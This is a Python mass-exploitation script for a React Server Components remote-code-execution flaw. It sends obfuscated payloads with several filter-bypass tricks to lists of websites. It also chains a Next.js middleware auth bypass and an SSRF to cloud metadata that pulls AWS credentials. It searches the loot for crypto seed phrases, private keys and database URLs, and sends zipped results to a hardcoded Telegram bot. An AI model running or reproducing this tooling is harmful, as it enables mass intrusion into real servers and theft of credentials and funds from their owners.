"""
Batch Scanner with Full Output Capture + Telegram Alerts
CVE-2025-55182 (React2Shell) — React Server Components RCE
Scans a list of websites, saves output, checks for crypto keys/secrets, and sends to Telegram.

FIXED + HARDENED — BOT TOKEN UPDATED TO @Haf[redacted]Bot
"""

from __future__ import annotations

import argparse
import asyncio
import aiohttp
import os
import json
import binascii
import re
import zlib
import shutil
import requests
from datetime import datetime
from functools import lru_cache
from typing import Any, Dict, List, Tuple

from jsmin import jsmin

DIGEST_PATTERN = re.compile(rb'"digest"\s*:\s*"([0-9a-fA-F]+)"')

# === TELEGRAM CONFIG — @Haf[redacted]Bot ===
TELEGRAM_BOT_TOKEN = "8647429734:AAHtD2vgBTePHTEonGq9wh03DXKvxKK001Y"   # @Haf[redacted]Bot
TELEGRAM_CHAT_ID = "8725127583"      # [redacted]'s chat

# Patterns for detecting crypto keys and secrets
CRYPTO_KEY_PATTERNS = {
    "EVM_PRIVATE_KEY": re.compile(r'0x[a-fA-F0-9]{64}\b'),  # Ethereum/EVM private keys (64 hex chars)
    "MNEMONIC_12": re.compile(r'\b(?:[a-z]+\s+){11}[a-z]+\b', re.IGNORECASE),
    "MNEMONIC_24": re.compile(r'\b(?:[a-z]+\s+){23}[a-z]+\b', re.IGNORECASE),
}

# Keywords to search for in env vars / configs
CRITICAL_KEYWORDS = [
    "SEED_PHRASE", "SEEDPHRASE", "MNEMONIC",
    "SOLANA_PRIVATE", "SOL_PRIVATE", "BTC_PRIVATE", "ETH_PRIVATE",
    "WALLET_KEY", "BITCOINVN", "BTCPAY",
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
    "DATABASE_URL", "REDIS_URL", "MONGO_URI",
]


def send_telegram_message(message: str, parse_mode: str = "HTML") -> bool:
    """Send a message to Telegram bot."""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        resp = requests.post(url, json=payload, timeout=30)
        return resp.status_code == 200
    except Exception as e:
        print(f"[!] Telegram send error: {e}")
        return False


def send_telegram_document(filepath: str, caption: str = "", retries: int = 3) -> bool:
    """Send a file to Telegram bot with retry on rate limit."""
    import time

    for attempt in range(retries):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(filepath, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption[:1024]}
                resp = requests.post(url, files=files, data=data, timeout=120)

                if resp.status_code == 200:
                    return True
                elif resp.status_code == 429:
                    try:
                        retry_after = resp.json().get('parameters', {}).get('retry_after', 30)
                    except:
                        retry_after = 30
                    print(f"    ⏳ Rate limited, waiting {retry_after}s...")
                    time.sleep(retry_after + 1)
                else:
                    print(f"    Telegram API error: {resp.text[:200]}")
                    return False
        except Exception as e:
            print(f"[!] Telegram document send error: {e}")
            if attempt < retries - 1:
                time.sleep(5)

    return False


def extract_crypto_keys(data: Any, path: str = "") -> List[Tuple[str, str, str]]:
    """Recursively search for crypto keys in data. Returns list of (key_type, value, path)."""
    found = []

    if isinstance(data, dict):
        for key, value in data.items():
            current_path = f"{path}.{key}" if path else key

            key_upper = str(key).upper()
            for keyword in CRITICAL_KEYWORDS:
                if keyword in key_upper:
                    if value and str(value).strip():
                        found.append((f"🔑 {keyword}", str(value)[:500], current_path))

            found.extend(extract_crypto_keys(value, current_path))

    elif isinstance(data, list):
        for i, item in enumerate(data):
            found.extend(extract_crypto_keys(item, f"{path}[{i}]"))

    elif isinstance(data, str):
        # Mnemonic detection: 12 or 24 lowercase alpha words
        words = data.lower().split()
        if len(words) in [12, 24]:
            if all(w.isalpha() and 2 <= len(w) <= 12 for w in words):
                found.append((f"🌱 MNEMONIC_{len(words)}", data, path))

    return found


class CVE202555182Scanner:
    def _obfuscate_str(self, text: str) -> str:
        codes = ",".join(str(ord(c)) for c in text)
        return f"String.fromCharCode({codes})"

    @lru_cache(maxsize=128)
    def _generate_core_payload(self, command: str, gadget: str, js_content: str | None) -> str:
        k_Buffer = self._obfuscate_str("Buffer")

        logic_body = ""

        if gadget == "shell":
            cmd_hex = binascii.hexlify(command.encode('utf-8')).decode('utf-8')
            logic_body = (
                f" var cmd = global[{k_Buffer}].from('{cmd_hex}', 'hex').toString(); "
                f" cp.exec(cmd, {{timeout: 5000}}, (e, out, err) => {{ "
                f"   if (e) out += '\\nERROR: ' + e.message; "
                f"   if (err) out += '\\nSTDERR: ' + err; "
                f"   var res_hex = global[{k_Buffer}].from(out).toString('hex'); "
                f"   reject(Object.assign(new Error('RCE_RES'), {{ digest: res_hex }})); "
                f" }});"
            )

        elif js_content:
            minified = jsmin(js_content)
            user_hex = binascii.hexlify(minified.encode('utf-8')).decode('utf-8')
            logic_body = (
                f" try {{ "
                f"   var user_code = global[{k_Buffer}].from('{user_hex}', 'hex').toString(); "
                f"   var val = eval(user_code); "
                f"   Promise.resolve(val).then(function(v) {{ "
                f"     var res_str = (typeof v === 'object') ? JSON.stringify(v) : String(v); "
                f"     try {{ res_str = zlib.deflateSync(res_str); }} catch(e) {{}} "
                f"     var res_hex = global[{k_Buffer}].from(res_str).toString('hex'); "
                f"     reject(Object.assign(new Error('RCE_RES'), {{ digest: res_hex }})); "
                f"   }}).catch(function(e) {{ "
                f"     reject(Object.assign(new Error('JS_EXEC_ERR'), {{ digest: global[{k_Buffer}].from('JS Async Error: ' + e.message).toString('hex') }})); "
                f"   }});"
                f" }} catch(e) {{ "
                f"   reject(Object.assign(new Error('JS_ERR'), {{ digest: global[{k_Buffer}].from('JS Error: ' + e.message).toString('hex') }})); "
                f" }} "
            )

        else:
            logic_body = "reject(new Error('INVALID_MODE'));"

        loader_code = (
            f"Promise.all([Function('return import(\"node:child_process\")')(), Function('return import(\"node:zlib\")')()])"
            f".then(([cp, zlib]) => {{ "
            f"   return new Promise((resolve, reject) => {{ "
            f"{logic_body}"
            f"   }});"
            f"}})"
        )

        return (
            f"var reject_bridge = arguments[1]; "
            f"({loader_code}).catch(err => reject_bridge(err)); "
        )

    def prepare_request(self, host: str, options: Dict[str, Any]) -> Dict[str, Any]:
        command = options.get("command", "id")
        js_content = options.get("payload_content")

        gadget = "shell"
        if js_content:
            gadget = "vm"

        payload_prefix = self._generate_core_payload(command, gadget, js_content)
        payload_prefix = payload_prefix.replace("__TARGET_HOST__", host)

        crafted_chunk = {
            "then": "$1:__proto__:then",           # prototype traversal
            "status": "resolved_model",             # fake chunk resolution
            "reason": -1,
            "value": '{"then": "$B0"}',             # triggers _formData.get
            "_response": {
                "_prefix": payload_prefix,           # JS code executed via Function()
                "_formData": {
                    "get": "$1:constructor:constructor",  # → Function constructor
                },
            },
        }

        boundary = "------------------------bissa_cve_boundary"

        # Build multipart body (always defined)
        part0 = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{json.dumps(crafted_chunk)}\r\n"
        )
        part1 = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
        )
        end = f"--{boundary}--\r\n"

        body_bytes = (part0 + part1 + end).encode("utf-8")

        # Choose bypass technique
        bypass = options.get("bypass", 0)
        
        if bypass == 2:
            # Padded: add 8KB garbage prefix
            padding = b"A" * 8192
            body_bytes = padding + body_bytes
        elif bypass == 3:
            # Boundary morph: randomize boundary
            import random, string
            new_boundary = "----" + ''.join(random.choices(string.ascii_letters + string.digits, k=24))
            boundary = f"------------------------{new_boundary}"
            part0 = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{json.dumps(crafted_chunk)}\r\n")
            part1 = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n")
            end = f"--{boundary}--\r\n"
            body_bytes = (part0 + part1 + end).encode("utf-8")

        base_url = host if host.startswith("http") else f"https://{host}"

        headers = {
            "Next-Action": "x",
        }
        
        if bypass == 4:
            # Spaces in Content-Type value
            headers["Content-Type"] = f"multipart/form-data;   boundary={boundary}"
        elif bypass == 6:
            # Null byte before Content-Type
            headers["Content-Type"] = f"\x00multipart/form-data; boundary={boundary}"
        else:
            headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        
        if bypass == 1:
            headers["Transfer-Encoding"] = "chunked"
        else:
            headers["Content-Length"] = str(len(body_bytes))
        
        if bypass == 5:
            headers["x-action-id"] = "x"

        return {
            "method": "POST",
            "url": base_url,
            "data": body_bytes,
            "headers": headers,
            "allow_redirects": True,
        }

    def extract_secret(self, body: bytes) -> str | None:
        if not body:
            return None
        try:
            match = DIGEST_PATTERN.search(body)
            if match:
                hex_content = match.group(1)
                decoded = binascii.unhexlify(hex_content)
                try:
                    return zlib.decompress(decoded).decode('utf-8', errors='replace')
                except zlib.error:
                    return decoded.decode('utf-8', errors='replace')
        except Exception:
            pass
        return None


# Clean pipeline rule: scanner discoveries must never be appended back into the
# input queue. Keep a separate registry so target sources stay auditable and do
# not become polluted with path variants during scans.
VULNERABLE_TARGETS_FILE = os.environ.get("VULNERABLE_TARGETS_FILE", "vulnerable_targets_registry.txt")
VULNERABLES_DIR = "vulnerables"

SECRET_VALUE_RE = re.compile(
    r"(AKIA|ASIA)[A-Z0-9]{16}|"
    r"sk-or-v1-[A-Za-z0-9_-]{12,}|sk-ant-[A-Za-z0-9_-]{12,}|sk-[A-Za-z0-9_-]{20,}|"
    r"gsk_[A-Za-z0-9_-]{12,}|r8_[A-Za-z0-9_-]{12,}|SG\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|"
    r"gh[pousr]_[A-Za-z0-9_]{12,}|github_pat_[A-Za-z0-9_]{20,}|"
    r"(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|rediss)://[^\s'\"<>]+|"
    r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----[\s\S]{0,200}?-----END [A-Z0-9 ]*PRIVATE KEY-----",
    re.IGNORECASE,
)


def redact_secret_text(value: Any) -> str:
    text = str(value or "")
    if len(text) > 500:
        text = text[:500] + "…"
    return SECRET_VALUE_RE.sub("[REDACTED]", text)


def sanitize_filename(url: str) -> str:
    name = url.replace("https://", "").replace("http://", "")
    for char in ['/', '\\', ':', '*', '?', '"', '<', '>', '|', '.']:
        name = name.replace(char, '_')
    return name[:50]


def append_vulnerable_target(target: str):
    existing = set()
    if os.path.exists(VULNERABLE_TARGETS_FILE):
        with open(VULNERABLE_TARGETS_FILE, 'r', encoding='utf-8') as f:
            existing = set(line.strip() for line in f if line.strip())

    if target not in existing:
        with open(VULNERABLE_TARGETS_FILE, 'a', encoding='utf-8') as f:
            f.write(target + '\n')


def save_to_vulnerables_folder(target: str, output: str = None):
    os.makedirs(VULNERABLES_DIR, exist_ok=True)
    try:
        os.chmod(VULNERABLES_DIR, 0o700)
    except Exception:
        pass

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = sanitize_filename(target)
    filename = f"valid_target_{safe_name}_{timestamp}.txt"
    filepath = os.path.join(VULNERABLES_DIR, filename)

    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f"Target: {target}\n")
        f.write(f"Found: {datetime.now().isoformat()}\n")
        if output:
            f.write(f"\nOutput:\n{output}\n")
    try:
        os.chmod(filepath, 0o600)
    except Exception:
        pass


async def scan_and_save(target: str, options: dict, session: aiohttp.ClientSession,
                        timeout: aiohttp.ClientTimeout, output_dir: str,
                        stats: dict, stats_lock: asyncio.Lock) -> dict:
    result = {"target": target, "vulnerable": False, "output": None, "error": None, "state": "unknown", "status": None}

    scanner = CVE202555182Scanner()
    
    # Try multiple bypass techniques (0=plain, 1=chunked, 5=dual_header, 3=boundary_morph)
    BYPASSES = [0, 5, 3, 1, 2, 4, 6]  # plain → dual-header → boundary-morph → chunked → padded → spaces → null-byte
    
    for bypass_id in BYPASSES:
        opts = dict(options)
        opts["bypass"] = bypass_id
        
        try:
            req_kwargs = scanner.prepare_request(target, opts)
        except Exception as e:
            continue
        
        try:
            async with session.request(**req_kwargs, timeout=timeout, ssl=False) as response:
                result["status"] = response.status
                body = await response.read()
                
                if b'"digest"' in body and b"<script" not in body:
                    extracted = scanner.extract_secret(body)
                    
                    if extracted and (
                        len(extracted) > 100 or
                        'platform' in extracted or
                        'env_vars' in extracted or 
                        'uid=' in extracted or
                        'process.env' in extracted or
                        'AWS_' in extracted or
                        'DATABASE_URL' in extracted
                    ):
                        result["vulnerable"] = True
                        result["state"] = "vulnerable"
                        result["output"] = extracted
                        result["bypass"] = bypass_id
                        
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        safe_name = sanitize_filename(target)
                        filename = f"{safe_name}_{timestamp}.json"
                        filepath = os.path.join(output_dir, filename)
                        
                        try:
                            json_data = json.loads(extracted)
                            output_content = {
                                "target": target,
                                "scan_time": datetime.now().isoformat(),
                                "data": json_data,
                                "bypass_used": bypass_id
                            }
                            with open(filepath, 'w', encoding='utf-8') as f:
                                json.dump(output_content, f, indent=2, ensure_ascii=False)
                            try:
                                os.chmod(filepath, 0o600)
                            except Exception:
                                pass
                        except json.JSONDecodeError:
                            filepath = filepath.replace('.json', '.txt')
                            with open(filepath, 'w', encoding='utf-8') as f:
                                f.write(f"Target: {target}\n")
                                f.write(f"Scan Time: {datetime.now().isoformat()}\n")
                                f.write(f"Bypass: {bypass_id}\n")
                                f.write(f"Output:\n{extracted}\n")
                            try:
                                os.chmod(filepath, 0o600)
                            except Exception:
                                pass
                        
                        append_vulnerable_target(target)
                        save_to_vulnerables_folder(target, extracted)
                        
                        async with stats_lock:
                            stats["vulnerable"] += 1
                            stats["completed"] += 1
                        n = stats["completed"]
                        print(f"[{n}/{stats['total']}] {target} - VULNERABLE! (bypass {bypass_id})")
                        return result
                    
        except asyncio.TimeoutError:
            result["state"] = "unknown_timeout"
            result["error"] = "timeout"
            continue
        except aiohttp.ClientConnectorError as e:
            result["state"] = "dns_or_connect_error"
            result["error"] = str(e)[:200]
            continue
        except aiohttp.ClientResponseError as e:
            result["state"] = "http_error"
            result["error"] = str(e)[:200]
            continue
        except Exception as e:
            result["state"] = "http_error"
            result["error"] = str(e)[:200]
            continue
    
    # Sibling vuln: Next.js middleware auth bypass (CVE-2025-29927) — high volume
    if not result.get("vulnerable"):
        try:
            base_url = target if target.startswith("http") else f"https://{target}"
            async with session.get(base_url, ssl=False, timeout=timeout,
                                   allow_redirects=False) as r0:
                status0 = r0.status
            if status0 in (401, 403):
                hdr = {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}
                async with session.get(base_url, ssl=False, timeout=timeout,
                                       allow_redirects=False, headers=hdr) as r1:
                    status1 = r1.status
                if status1 == 200:
                    result["vulnerable"] = True
                    result["state"] = "middleware_bypass"
                    result["status"] = status1
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe_name = sanitize_filename(target)
                    out = {
                        "target": target,
                        "scan_time": datetime.now().isoformat(),
                        "data": {
                            "platform": "nextjs-middleware-bypass",
                            "cve": "CVE-2025-29927",
                            "env_vars": {},
                            "env_vars_count": "0",
                            "note": f"middleware auth bypassed ({status0} -> {status1})",
                        },
                    }
                    filepath = os.path.join(output_dir, f"{safe_name}_{timestamp}_mwbypass.json")
                    with open(filepath, "w", encoding="utf-8") as f:
                        json.dump(out, f)
                    try:
                        os.chmod(filepath, 0o600)
                    except Exception:
                        pass
                    append_vulnerable_target(target)
                    save_to_vulnerables_folder(target, f"CVE-2025-29927 middleware bypass: {status0} -> {status1}")
                    async with stats_lock:
                        stats["vulnerable"] += 1
        except Exception:
            pass

    # Sibling vuln: Next.js image optimizer SSRF -> cloud metadata (live AWS keys)
    # Two-step IMDS: (1) role name, (2) role credentials. Strict: only flag when
    # a real AccessKeyId + SecretAccessKey are extracted (no HTML false-positives).
    if not result.get("vulnerable"):
        try:
            base_url = target if target.startswith("http") else f"https://{target}"
            role_url = (f"{base_url}/_next/image?url=http://169.254.169.254/latest/"
                        "meta-data/iam/security-credentials/&w=64&q=75")
            async with session.get(role_url, ssl=False, timeout=timeout,
                                   allow_redirects=True) as r:
                role_body = await r.read()
            role = role_body.decode("utf-8", "replace").strip()
            if role and len(role) < 100 and "<" not in role and ">" not in role \
               and "{" not in role and "\n" not in role and " " not in role:
                key_url = (f"{base_url}/_next/image?url=http://169.254.169.254/latest/"
                           f"meta-data/iam/security-credentials/{role}&w=64&q=75")
                async with session.get(key_url, ssl=False, timeout=timeout,
                                       allow_redirects=True) as r2:
                    key_body = await r2.read()
                text = key_body.decode("utf-8", "replace")
                ak = re.search(r"<AccessKeyId>([A-Z0-9]+)</AccessKeyId>", text)
                sk = re.search(r"<SecretAccessKey>([A-Za-z0-9+/]+)</SecretAccessKey>", text)
                tok = re.search(r"<Token>([^<]+)</Token>", text)
                if ak and sk:
                    result["vulnerable"] = True
                    result["state"] = "ssrf_vulnerable"
                    result["status"] = r2.status
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe_name = sanitize_filename(target)
                    out = {
                        "target": target,
                        "scan_time": datetime.now().isoformat(),
                        "data": {
                            "platform": "aws-metadata-ssrf",
                            "iam_role": role,
                            "env_vars": {
                                "AWS_ACCESS_KEY_ID": ak.group(1),
                                "AWS_SECRET_ACCESS_KEY": sk.group(1),
                                "AWS_SESSION_TOKEN": tok.group(1) if tok else "",
                            },
                            "env_vars_count": "3",
                        },
                    }
                    filepath = os.path.join(output_dir, f"{safe_name}_{timestamp}_ssrf.json")
                    with open(filepath, "w", encoding="utf-8") as f:
                        json.dump(out, f)
                    try:
                        os.chmod(filepath, 0o600)
                    except Exception:
                        pass
                    append_vulnerable_target(target)
                    save_to_vulnerables_folder(target, text[:2000])
                    async with stats_lock:
                        stats["vulnerable"] += 1
        except Exception:
            pass

    # All bypasses failed
    if result.get("state") in (None, "unknown"):
        if result.get("status") in (401, 403, 429):
            result["state"] = "blocked_waf"
        elif result.get("status"):
            result["state"] = "not_vulnerable"
        else:
            result["state"] = "unknown_error"
    async with stats_lock:
        stats["completed"] += 1
    n = stats["completed"]
    print(f"[{n}/{stats['total']}] {target} - {result.get('state')}")
    return result


async def run_batch_scan(targets: list[str], options: dict, output_dir: str,
                         concurrency: int = 50, timeout_sec: int = 20):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"{output_dir}_{timestamp}"

    stats = {"total": len(targets), "completed": 0, "vulnerable": 0, "failed": 0, "states": {}}
    stats_lock = asyncio.Lock()

    os.makedirs(output_dir, exist_ok=True)
    try:
        os.chmod(output_dir, 0o700)
    except Exception:
        pass

    print("=" * 70)
    print("CVE-2025-55182 Batch Scanner — @Haf[redacted]Bot")
    print("=" * 70)
    print(f"[*] Targets: {len(targets)}")
    print(f"[*] Concurrency: {concurrency} | Timeout: {timeout_sec}s")
    print(f"[*] Output directory: {output_dir}")
    print(f"[*] Telegram: Will send zip when complete")
    print(f"[*] Vulnerable registry: {VULNERABLE_TARGETS_FILE}")
    print("-" * 70)

    timeout = aiohttp.ClientTimeout(total=timeout_sec, connect=timeout_sec)
    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=5, ttl_dns_cache=300)
    semaphore = asyncio.Semaphore(concurrency)

    async def scan_with_semaphore(target: str, session: aiohttp.ClientSession) -> dict:
        async with semaphore:
            return await scan_and_save(target, options, session, timeout, output_dir, stats, stats_lock)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [scan_with_semaphore(target, session) for target in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    for item in results:
        if isinstance(item, dict):
            st = item.get("state") or ("vulnerable" if item.get("vulnerable") else "unknown")
            stats["states"][st] = stats["states"].get(st, 0) + 1
        else:
            stats["states"]["task_exception"] = stats["states"].get("task_exception", 0) + 1

    print("\n" + "=" * 70)
    print("[*] Scan complete!")
    print(f"    Total scanned: {stats['total']}")
    print(f"    Vulnerable: {stats['vulnerable']}")
    print(f"    Failed: {stats['failed']}")
    print(f"[+] Results saved in: {output_dir}")

    # === Post-scan analysis ===
    print("\n[*] Analyzing results...")
    critical_findings = []

    for filename in sorted(os.listdir(output_dir)):
        if filename.startswith('_') or not filename.endswith('.json'):
            continue

        filepath = os.path.join(output_dir, filename)
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                file_data = json.load(f)

            target = file_data.get('target', filename)
            data = file_data.get('data', file_data)

            critical_keys = extract_crypto_keys(data)

            if critical_keys:
                critical_findings.append({
                    'target': target,
                    'keys': [(kt, '[REDACTED]', p) for kt, _v, p in critical_keys],
                    'file': filepath
                })
                print(f"    🚨 CRITICAL: {target} - {len(critical_keys)} keys found!")

        except Exception:
            continue

    print(f"    Found {len(critical_findings)} targets with critical keys")

    # === Summary ===
    summary_file = os.path.join(output_dir, f"_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write(f"Scan Summary\n")
        f.write(f"============\n")
        f.write(f"Date: {datetime.now().isoformat()}\n")
        f.write(f"Total: {stats['total']}\n")
        f.write(f"Vulnerable: {stats['vulnerable']}\n")
        f.write(f"Failed: {stats['failed']}\n")
        f.write(f"States: {json.dumps(stats.get('states', {}), sort_keys=True)}\n")
        f.write(f"Vulnerable registry: {VULNERABLE_TARGETS_FILE}\n")
        f.write(f"Critical Findings: {len(critical_findings)} targets\n")
        f.write(f"\nVulnerable targets:\n")
        for filename in sorted(os.listdir(output_dir)):
            if not filename.startswith('_') and filename.endswith(('.json', '.txt')):
                f.write(f"  - {filename}\n")

        if critical_findings:
            f.write(f"\n\nCRITICAL CRYPTO KEYS FOUND:\n")
            f.write(f"===========================\n")
            for finding in critical_findings:
                f.write(f"\nTarget: {finding['target']}\n")
                for key_type, value, path in finding['keys']:
                    f.write(f"  {key_type}: {redact_secret_text(value)}\n")

    if critical_findings:
        crypto_file = os.path.join(output_dir, f"_critical_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(crypto_file, 'w', encoding='utf-8') as f:
            json.dump(critical_findings, f, indent=2, ensure_ascii=False, default=str)
        try:
            os.chmod(crypto_file, 0o600)
        except Exception:
            pass
        print(f"[+] Critical keys saved: {crypto_file}")

    try:
        os.chmod(summary_file, 0o600)
    except Exception:
        pass
    print(f"[+] Summary saved: {summary_file}")

    # === Zip & deliver ===
    print(f"\n[*] Zipping results folder...")
    zip_filename = f"{output_dir}.zip"
    try:
        shutil.make_archive(output_dir, 'zip', output_dir)
        try:
            os.chmod(zip_filename, 0o600)
        except Exception:
            pass
        zip_size = os.path.getsize(zip_filename) / (1024 * 1024)
        print(f"    Created: {zip_filename} ({zip_size:.1f} MB)")

        send_tg = os.environ.get("SEND_TELEGRAM", "0") == "1"
        if zip_size < 50 and send_tg:
            print(f"[*] Sending zip to Telegram...")
            caption = f"📦 Scan Results\n\n"
            caption += f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
            caption += f"🎯 Vulnerable: {stats['vulnerable']}\n"
            caption += f"🚨 Critical: {len(critical_findings)}"

            if send_telegram_document(zip_filename, caption):
                print(f"    ✅ Zip sent to Telegram!")
            else:
                print(f"    ❌ Failed to send zip")
        elif zip_size < 50:
            print(f"    Telegram delivery disabled by default (set SEND_TELEGRAM=1 to send raw result zip)")
        else:
            print(f"    ⚠️ Zip too large for Telegram ({zip_size:.1f} MB > 50 MB limit)")
    except Exception as e:
        print(f"    ❌ Zip error: {e}")


# ============================ DEDUP_BLOCK_v1 ============================
# One-time-scan gate (2026-09-16). Canonical host -> registry lookup; unseen hosts
# are CLAIMED before probing so no lane/worker can scan the same domain twice.
import sqlite3
import fcntl

SCAN_DB = os.environ.get("SCAN_REGISTRY_DB", "/root/ct_dump/scanned.db")
SCAN_TEXT = os.environ.get("SCAN_REGISTRY_TEXT", "/root/ct_dump/priority_scanned.txt")
SCAN_DEDUP = os.environ.get("SCAN_DEDUP", "1") != "0"


def canon_target(t: str) -> str:
    """Canonical scan key: host only, lowercase, no scheme/path/port/user, no leading '*.' or 'www.'."""
    h = (t or "").strip().lower()
    h = re.sub(r"^\*\.", "", h)
    h = re.sub(r"^[a-z][a-z0-9+.-]*://", "", h)
    h = h.split("#")[0].split("?")[0].split("/")[0]
    if "@" in h:
        h = h.split("@")[-1]
    h = re.sub(r":\d+$", "", h)
    h = h.strip(".")
    if h.startswith("www."):
        h = h[4:]
    return h


def _dedup_db():
    os.makedirs(os.path.dirname(SCAN_DB), exist_ok=True)
    con = sqlite3.connect(SCAN_DB, timeout=30)
    con.execute("PRAGMA journal_mode=WAL")
    con.execute("PRAGMA busy_timeout=30000")
    con.execute("CREATE TABLE IF NOT EXISTS seen (host TEXT PRIMARY KEY, ts TEXT)")
    n = con.execute("SELECT COUNT(*) FROM seen").fetchone()[0]
    if n == 0 and os.path.exists(SCAN_TEXT):
        rows = []
        with open(SCAN_TEXT, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                h = canon_target(line)
                if h:
                    rows.append((h, "bootstrap"))
        with con:
            con.executemany("INSERT OR IGNORE INTO seen(host, ts) VALUES (?,?)", rows)
        print(f"[dedup] registry bootstrapped: {len(rows)} entries from {SCAN_TEXT}")
    return con


def _claim_text(hosts):
    """Append claimed hosts to the text registry under flock (dispatcher re-sorts it)."""
    try:
        with open(SCAN_TEXT, "a", encoding="utf-8") as f:
            fcntl.flock(f.fileno(), fcntl.LOCK_EX)
            f.write("\n".join(hosts) + "\n")
            fcntl.flock(f.fileno(), fcntl.LOCK_UN)
    except Exception as e:
        print(f"[dedup] warn: text registry append failed: {e}")


def filter_unseen(targets):
    """Return (kept_targets, stats). Keeps ALL path variants of a not-yet-scanned host."""
    if not SCAN_DEDUP:
        return targets, {"in": len(targets), "hosts_in": len(targets), "hosts_fresh": len(targets), "skipped": 0, "queued": len(targets), "dedup": "off"}
    con = _dedup_db()
    host_of = {}
    for t in targets:
        c = canon_target(t)
        if c:
            host_of.setdefault(c, []).append(t)
    hosts = list(host_of)
    seen = set()
    CH = 800
    for i in range(0, len(hosts), CH):
        chunk = hosts[i:i + CH]
        q = "SELECT host FROM seen WHERE host IN (%s)" % ",".join("?" * len(chunk))
        seen.update(r[0] for r in con.execute(q, chunk))
    fresh = [h for h in hosts if h not in seen]
    kept = [t for h in fresh for t in host_of[h]]
    # CLAIM before probing
    if fresh:
        try:
            with con:
                con.executemany("INSERT OR IGNORE INTO seen(host, ts) VALUES (?, datetime('now'))",
                                [(h,) for h in fresh])
        except Exception as e:
            print(f"[dedup] warn: claim failed: {e}")
        _claim_text(fresh)
    con.close()
    return kept, {"in": len(targets), "skipped": len(targets) - len(kept), "queued": len(kept),
                  "hosts_in": len(hosts), "hosts_fresh": len(fresh), "dedup": "on"}
# ========================== /DEDUP_BLOCK_v1 ============================


def main():
    parser = argparse.ArgumentParser(
        description="Batch scan websites for CVE-2025-55182 (React2Shell) and save full output",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Recon scan with fast_recon.js payload
  python batch_output.py --list targets.txt --js payloads/fast_recon.js

  # Run a shell command on all vuln targets
  python batch_output.py -l targets.txt --cmd "cat /etc/passwd"

  # Custom output + higher speed
  python batch_output.py -l targets.txt --js payloads/fast_recon.js -o ReconRes -c 100 -t 10
        """
    )
    parser.add_argument("--list", "-l", required=True, help="File with target URLs (one per line)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--cmd", help="Shell command to execute on vuln targets")
    group.add_argument("--js", help="Path to JavaScript payload file")
    parser.add_argument("--output", "-o", default="Res", help="Output directory (default: Res)")
    parser.add_argument("--concurrency", "-c", type=int, default=50, help="Concurrent requests (default: 50)")
    parser.add_argument("--timeout", "-t", type=int, default=20, help="Request timeout in seconds (default: 20)")
    parser.add_argument("--rescan", action="store_true",
                        help="Bypass the one-time-scan dedup gate for this batch (re-probe known hosts)")
    parser.add_argument("--paths", "-p", default=None,
                        help="Comma-separated paths to probe (default: /). Example: /,/api,/_rsc")

    args = parser.parse_args()
    global SCAN_DEDUP
    if getattr(args, "rescan", False):
        SCAN_DEDUP = False
        os.environ["SCAN_DEDUP"] = "0"

    if not os.path.exists(args.list):
        print(f"[!] File not found: {args.list}")
        return

    with open(args.list, 'r', encoding='utf-8') as f:
        base_targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]

    if not base_targets:
        print("[!] No targets found in the file")
        return

    # Multi-path expansion: probe /, /api, /_rsc for each domain
    if args.paths:
        paths = [p.strip() for p in args.paths.split(',') if p.strip()]
        targets = []
        for base in base_targets:
            for path in paths:
                path_part = path if path.startswith('/') else f'/{path}'
                targets.append(f"{base}{path_part}" if not base.endswith('/') else f"{base.rstrip('/')}{path_part}")
        print(f"[*] Multi-path enabled: {len(paths)} paths → {len(targets)} total probes")
    else:
        targets = base_targets

    # ---- one-time-scan gate (canonical host dedup) -------------------------
    targets, _dstats = filter_unseen(targets)
    print(f"[dedup] {_dstats['dedup']}: {_dstats['hosts_in']} hosts in ({_dstats['in']} probes) -> "
          f"{_dstats['hosts_fresh']} unseen hosts ({_dstats['queued']} probes) | "
          f"skipped {_dstats['skipped']} already-scanned probes")
    if not targets:
        print("[dedup] every host in this batch was already scanned — nothing to do")
        return

    options = {}
    if args.cmd:
        options["command"] = args.cmd
    elif args.js:
        if not os.path.exists(args.js):
            print(f"[!] Payload file not found: {args.js}")
            return
        with open(args.js, 'r', encoding='utf-8') as f:
            options["payload_content"] = f.read()

    asyncio.run(run_batch_scan(targets, options, args.output, args.concurrency, args.timeout))


if __name__ == "__main__":
    main()
